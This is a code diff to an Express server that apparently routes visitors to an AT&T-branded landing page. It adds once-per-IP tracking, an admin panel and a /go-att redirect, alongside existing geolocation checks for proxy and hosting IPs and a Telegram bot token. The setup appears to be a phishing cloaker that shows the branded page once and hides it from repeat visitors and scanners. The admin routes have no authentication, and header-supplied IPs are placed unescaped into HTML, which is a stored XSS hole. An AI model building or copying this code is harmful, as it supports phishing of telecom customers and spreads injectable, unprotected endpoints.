@@ -4,9 +4,41 @@ const path = require('path');
 const cors = require('cors');
 const helmet = require('helmet');
 const rateLimit = require('express-rate-limit');
+const fs = require('fs');
 
 const app = express();
 const port = process.env.PORT || 3000;
+
+// Path to store visited IPs
+const VISITED_IPS_FILE = path.join(__dirname, 'visited_ips.json');
+
+// Ensure the file exists
+if (!fs.existsSync(VISITED_IPS_FILE)) {
+    fs.writeFileSync(VISITED_IPS_FILE, JSON.stringify([]));
+}
+
+function getVisitedIps() {
+    try {
+        const data = fs.readFileSync(VISITED_IPS_FILE, 'utf8');
+        return JSON.parse(data);
+    } catch (e) {
+        return [];
+    }
+}
+
+function addVisitedIp(ip) {
+    const ips = getVisitedIps();
+    if (!ips.includes(ip)) {
+        ips.push(ip);
+        fs.writeFileSync(VISITED_IPS_FILE, JSON.stringify(ips, null, 2));
+    }
+}
+
+function removeVisitedIp(ip) {
+    const ips = getVisitedIps();
+    const newIps = ips.filter(i => i !== ip);
+    fs.writeFileSync(VISITED_IPS_FILE, JSON.stringify(newIps, null, 2));
+}
 
 // IMPORTANT: Set these environment variables in your hosting provider
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
@@ -78,6 +110,12 @@ app.get('/init', async (req, res) => {
     let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     if (clientIp.includes(',')) clientIp = clientIp.split(',')[0].trim();
     
+    // Check if user has already visited the ATT landing page
+    const visitedIps = getVisitedIps();
+    if (visitedIps.includes(clientIp)) {
+        return res.json({ redirect: NON_ATT_LANDING_PAGE });
+    }
+
     let data = null;
     try {
         const response = await axios.get(`http://ip-api.com/json/${clientIp}?fields=status,message,country,regionName,city,isp,org,as,proxy,hosting,query`);
@@ -122,8 +160,78 @@ app.get('/init', async (req, res) => {
     res.json({ redirect: targetUrl });
 });
 
+// Admin Panel to manage visited IPs
+app.get('/admin', (req, res) => {
+    const ips = getVisitedIps();
+    let html = `
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Admin Panel - Visited IPs</title>
+            <style>
+                body { font-family: sans-serif; padding: 20px; }
+                table { border-collapse: collapse; width: 100%; max-width: 600px; }
+                th, td { border: 1px solid #ddd; padding: 10px; text-align: left; }
+                th { background-color: #f4f4f4; }
+                .remove-btn { color: red; cursor: pointer; text-decoration: underline; }
+            </style>
+        </head>
+        <body>
+            <h1>Visited IPs Management</h1>
+            <p>These users have already visited the AT&T landing page and are currently restricted from visiting it again.</p>
+            <table>
+                <thead>
+                    <tr>
+                        <th>IP Address</th>
+                        <th>Action</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    ${ips.map(ip => `
+                        <tr>
+                            <td>${ip}</td>
+                            <td><span class="remove-btn" onclick="removeIp('${ip}')">Remove</span></td>
+                        </tr>
+                    `).join('')}
+                </tbody>
+            </table>
+
+            <script>
+                async function removeIp(ip) {
+                    if (confirm('Are you sure you want to allow ' + ip + ' to revisit the landing page?')) {
+                        const response = await fetch('/api/admin/remove', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ ip })
+                        });
+                        if (response.ok) {
+                            window.location.reload();
+                        } else {
+                            alert('Failed to remove IP');
+                        }
+                    }
+                }
+            </script>
+        </body>
+        </html>
+    `;
+    res.send(html);
+});
+
+// Endpoint to remove an IP from the visited list
+app.post('/api/admin/remove', (req, res) => {
+    const { ip } = req.body;
+    if (!ip) return res.status(400).send('IP is required');
+    removeVisitedIp(ip);
+    res.status(200).send('IP removed successfully');
+});
+
 // Redirect to AT&T landing page
 app.get('/go-att', (req, res) => {
+    let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    if (clientIp.includes(',')) clientIp = clientIp.split(',')[0].trim();
+    
+    addVisitedIp(clientIp);
     res.redirect(ATT_LANDING_PAGE);
 });
 
